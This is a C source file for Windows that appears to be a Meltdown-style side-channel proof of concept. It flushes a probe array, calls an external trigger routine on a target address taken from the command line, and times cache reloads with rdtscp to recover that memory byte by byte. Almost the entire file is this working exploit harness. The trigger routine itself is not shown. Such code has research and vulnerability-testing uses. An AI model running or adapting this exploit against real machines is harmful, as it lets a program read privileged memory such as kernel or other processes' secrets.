#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

//#define SPLIT

#ifdef _MSC_VER

#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

void __fastcall trigger(char *addr, int *probe);
void __fastcall trigger2(char *addr, int *probe);


void __fastcall trigger_noexcept(char *addr, int *probe);

void main(int argc,char **argv) {
	int min = 0;
	uint64_t t = -1;
	unsigned int junk = 0;
	char *secret = "Oops,you find me!\n";
	UINT64 target = (UINT64)0x140001000;
	UINT64 maxlength = 0x10;
	if (argc == 3) {
		if (!sscanf(argv[1], "%p", &target)) {
			printf("bad arg\n");
			return ;
		}
		if (!sscanf(argv[2], "%p", &maxlength)) {
			printf("bad length\n");
			return ;
		}
		printf("Target:%llx,length:%llx\n", target, maxlength);
	}
	int i = 0;
#ifdef SPLIT
		int *probe[0x100] = { 0 };
		for (i = 0; i < 0x100; i++) {
			probe[i] = (int *)malloc(0x1000);
		}
#else
	int *probe = malloc(0x1000 * 0x100);
#endif

	DWORD old;
	int loop = 0;
	int flag_enter = 0;
	UINT64 length = 0;
	for (length = 0; length < maxlength;length++) {
		loop = 0;
		min = 0;
		t = -1;
		while (loop++ < 0x10 && min == 0) {
			for (i = 0; i < 0x100; i++) {
#ifdef SPLIT
				_mm_clflush(probe[i]);
#else
				_mm_clflush(&probe[0x400 * i]);
#endif
			}
			for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
			trigger((char *)(target + length), probe);
			register uint64_t time1, time2;
			uint64_t timer[0x100] = { 0 };
			for (i = 0; i < 0x100; i++) {
				time1 = __rdtscp(&junk); /* READ TIMER */
#ifdef SPLIT
				junk = *(probe[i]); /* MEMORY ACCESS TO TIME */
#else
				junk = probe[0x400 * i];
#endif
				time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
				timer[i] = time2;
			}
			for (i = 0; i < 0x100; i++) {
				//printf("%d,", timer[i]);
				if (timer[i] <= t) {
					t = timer[i];
					if (t < 0x88)
						min = i;
				}
			}
		}
		if (t<0x88) {
			if (!flag_enter) {
				printf("\n%02x,%d,%x,addr:%llx\n", min, t, loop, target + length);
			}
			printf("%02x ", min);
			flag_enter = 1;
		}
		else {
			if (flag_enter) {
				flag_enter = 0;
				printf("\n%02x,%d,%x,addr:%llx\n", min, t, loop, target + length);
			}
		}
	}
	//if(min)system("pause");

}
